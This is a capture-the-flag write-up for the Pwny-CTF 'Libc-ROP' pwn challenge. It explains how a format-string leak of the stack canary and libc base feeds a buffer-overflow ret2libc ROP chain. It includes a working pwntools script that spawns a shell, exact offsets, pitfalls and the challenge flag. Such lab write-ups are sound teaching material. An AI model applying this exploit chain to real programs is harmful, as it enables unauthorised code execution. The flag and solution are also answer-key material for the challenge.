---
title: "Libc-ROP"
ctf: "Pwny-CTF"
category: "pwn"
difficulty: "Not specified"
points: 500
techniques: ["format-string", "buffer-overflow", "ret2libc", "rop", "shellcode", "got-overwrite", "stack-canary", "pie-bypass", "nx-bypass", "reverse-engineering"]
tools: ["pwntools", "checksec", "one-gadget", "netcat", "python"]
keywords: ["Libc-ROP", "Pwny-CTF", "pwn", "format-string", "buffer-overflow", "ret2libc", "rop", "shellcode", "got-overwrite", "stack-canary", "pie-bypass", "pwntools", "checksec", "one-gadget", "netcat", "python"]
status: "solved"
has_script: true
source: "Pwny-CTF/CHALLENGES/PWN-III-ROP/Libc-ROP/notes.md"
---

# Libc-ROP (Pwny-CTF, pwn)

## Summary
Challenge **Libc-ROP** from the Pwny-CTF CTF, pwn category. Main technique: format-string. The Libc-ROP (Pwny-CTF, pwn) challenge is documented by a resolution note.

## Statement and artefacts
Can you pwn this program and read flag.txt? This binary has full protections 😳

`nc chal.sigpwny.com 1369`

**Provided files / artifacts:**
- `work/challenge (file, 19.3 KB)`
- `work/challenge_patched (file, 24.0 KB)`
- `work/ld-2.31.so (library, 187.0 KB)`
- `work/libc.so.6 (file, 7.1 MB)`

## Recognition signals
- Signal: Forgot the saved RBP (the initial bug): layout = buffer(40) -> canary(8) -> saved RBP(8) -> saved RIP. My payload was.+p64(canary)+p64(target) -> the target fell on the saved RBP, not the saved RIP. There need to be 8 bytes of padding (p64(0)) between canary and target. Always recount: taille_buf + 8 (canary) + 8 (rbp) until RIP.
- Signal: Rewrite the canary identically: overflow beyond the canary -> put it back (leaked value) otherwise __stack_chk_fail -> crash. It is at offset rbp-8 here (40 from the buffer).
- Signal: one_gadget often unusable from a clean ret: 0xe3afe (r15==NULL && r12==NULL) gave 0/3 locally (constraints not met when returning main) -> fall back on system("/bin/sh") via pop rdi. (The one_gadget works when a hook/primitive sets the correct registers to 0, see GOT Overwrite.).
- Signal: Stack alignment 16 bytes: system/do_system uses movaps -> if rsp is not aligned, SIGSEGV. We insert a ret gadget before the chain to realign.
- Signal: Base libc: leak - 0xf3 - sym["__libc_start_main"] (the 0xf3 = offset of the ret in __libc_start_main for this libc 2.31). pwntools alternative: libc.address = leak - libc.libc_start_main_return.

## Resolution method
1. **The program (challenge.c)**

- `char answer[32];`, then:
  - `gets(answer)` #1 → `printf(answer)` → **format string** (leaked).
  - `gets(answer)` #2 → **buffer overflow** → ROP.
- `checksec`: **Full RELRO + Canary + PIE + NX** (“full protections”). libc-2.31 provided.

2. **Offsets (measured)**

- **FSB** (exact payload `%13$p %11$p`, stable 6/6):
  - `%13$p` = `__libc_start_main_ret` = `libc + 0x24083`. → `libc.address = leak - 0xf3 - libc.sym["__libc_start_main"]`.
  - `%11$p` = **canary** (value ending with `00`).
  - ⚠️ The indexes `%N$p` **shift with the length of the payload**: set the payload once and keep this index.
- **Overflow** (disassembly of `main`): `answer = [rbp-0x30]`, canary = `[rbp-0x8]`.
  - answer → canary = **40** bytes; saved RBP = **48**; **saved RIP = 56**.

3. **The chain that works**

```python
# leak
io.sendlineafter(b"it.", b"%13$p %11$p")
line = io.recvuntil(b"from?")
leak, canary = leak_hex_int(line)[0], leak_hex_int(line)[1]
libc.address = leak - 0xf3 - libc.sym["__libc_start_main"]
# ROP ret2libc
rop = ROP(libc)
pop_rdi = rop.find_gadget(["pop rdi","ret"])[0]
ret     = rop.find_gadget(["ret"])[0]           #16 byte alignment (movaps in system)
binsh   = next(libc.search(b"/bin/sh\x00"))
payload = b"A"*40 + p64(canary) + p64(0) + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(libc.sym["system"])
io.sendlineafter(b"from?", payload)
io.interactive()
```
Flag: `sigpwny{HUGH_congratulations_for_figuring_that_one_out!}`.

4. **Difficult with the neighbors**

- Like **4 - Format** / **Bug Bounty 6** (FSB leak canary+address) but here the 2nd step is a **complete ret2libc ROP** (not ret2shellcode: NX activated) and the libc must be **rebased** since the leak.

5. **To remember / pitfalls (those that blocked me)**

- **Forgot the saved RBP (the initial bug)**: layout = buffer(40) → **canary(8)** → **saved RBP(8)** → **saved RIP**. My payload was `...+p64(canary)+p64(target)` → the target fell on the **saved RBP**, not the saved RIP. **8 bytes of padding** (`p64(0)`) are required between canary and target. Always count again: `buffer_size + 8 (canary) + 8 (rbp)` until RIP.
- **Rewrite the canary identically**: overflow beyond the canary → put it back (leaked value) otherwise `__stack_chk_fail` → crash. It is at offset `rbp-8` here (40 from the buffer).
- **one_gadget often unusable from a clean `ret`**: `0xe3afe` (`r15==NULL && r12==NULL`) gave **0/3** locally (constraints not met when `main` returned). → fall back on **`system("/bin/sh")`** via `pop rdi`. (The one_gadget works when a hook/primitive sets the correct registers to 0, see GOT Overwrite.)
- **16-byte stack alignment**: `system`/`do_system` uses `movaps` → if `rsp` is not aligned, SIGSEGV. We insert a **`ret` gadget** before the chain to realign.
- **Libc base**: `leak - 0xf3 - sym["__libc_start_main"]` (`0xf3` = offset of `ret` in `__libc_start_main` for this libc 2.31). Alternative pwntools: `libc.address = leak - libc.libc_start_main_return`.

## Solve script
Script path: `scripts/pwny.py`

## Flag
sigpwny{HUGH_congratulations_for_figuring_that_one_out!}

## Lessons and reusable patterns
- Main technique: format-string.
